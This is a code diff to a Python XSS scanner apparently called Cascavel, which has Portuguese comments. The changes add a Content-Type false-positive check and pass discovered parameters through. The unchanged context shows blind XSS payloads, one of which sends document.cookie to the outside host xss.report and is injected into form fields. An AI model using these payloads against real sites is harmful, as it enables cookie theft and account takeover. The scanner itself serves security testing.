@@ -161,6 +161,11 @@ def _test_reflected(target, param, is_waf_reflection):
                     headers={**{"User-Agent": "Cascavel/2.0"}, **headers},
                 )
                 if payload in resp.text:
+                    # Validar Multi-estágio: Content-Type deve permitir renderização de HTML
+                    ctype = resp.headers.get("Content-Type", "").lower()
+                    if "json" in ctype or "xml" in ctype or "text/plain" in ctype:
+                        continue  # Eliminação de falso positivo: XSS não renderiza em JSON puro sem HTML
+
                     return {
                         "tipo": "XSS_REFLETIDO",
                         "metodo": method,
@@ -239,22 +244,24 @@ def _detect_dom_xss(target):
     return unique
 
 
-def _detect_blind_xss_sinks(target):
+def _detect_blind_xss_sinks(target, context=None):
     """Injeta blind XSS payloads em campos que podem ser renderizados em painel admin."""
     blind_payloads = [
         '<img src=x onerror=fetch("https://xss.report/c/cascavel")>',
         '"><script src=https://xss.report/c/cascavel></script>',
         '\'><img src=x onerror=this.src="https://xss.report/c/cascavel?c="+document.cookie>',
     ]
-    blind_params = [
-        "name",
-        "email",
-        "comment",
-        "feedback",
-        "message",
-        "subject",
-        "body",
-    ]
+    blind_params = context.get("discovered_params", []) if context else []
+    if not blind_params:
+        blind_params = [
+            "name",
+            "email",
+            "comment",
+            "feedback",
+            "message",
+            "subject",
+            "body",
+        ]
     injected = []
     for param in blind_params:
         for payload in blind_payloads:
@@ -274,7 +281,7 @@ def _detect_blind_xss_sinks(target):
     return None
 
 
-def run(target, ip, open_ports, banners):
+def run(target, ip, open_ports, banners, context=None):
     """
     Scanner XSS 2026-Grade — Reflected, DOM-based, Blind, Mutation.
 
@@ -286,15 +293,17 @@ def run(target, ip, open_ports, banners):
     _ = (ip, open_ports, banners)
     vulns = []
 
+    params_to_test = context.get("discovered_params", PARAMS) if context else PARAMS
+
     # 1. Reflected XSS — GET + headers bypass
-    for param in PARAMS:
+    for param in params_to_test:
         is_waf_reflection = _verify_waf_blind_reflection(target, param)
         vuln = _test_reflected(target, param, is_waf_reflection)
         if vuln:
             vulns.append(vuln)
 
     # 2. Reflected XSS — POST
-    for param in PARAMS[:15]:
+    for param in params_to_test[:15]:
         is_waf_reflection = _verify_waf_blind_reflection(target, param, method="POST")
         vuln = _test_reflected_post(target, param, is_waf_reflection)
         if vuln:
@@ -305,7 +314,7 @@ def run(target, ip, open_ports, banners):
     vulns.extend(dom_vulns)
 
     # 4. Blind XSS injection
-    blind = _detect_blind_xss_sinks(target)
+    blind = _detect_blind_xss_sinks(target, context)
     if blind:
         vulns.append(blind)
 
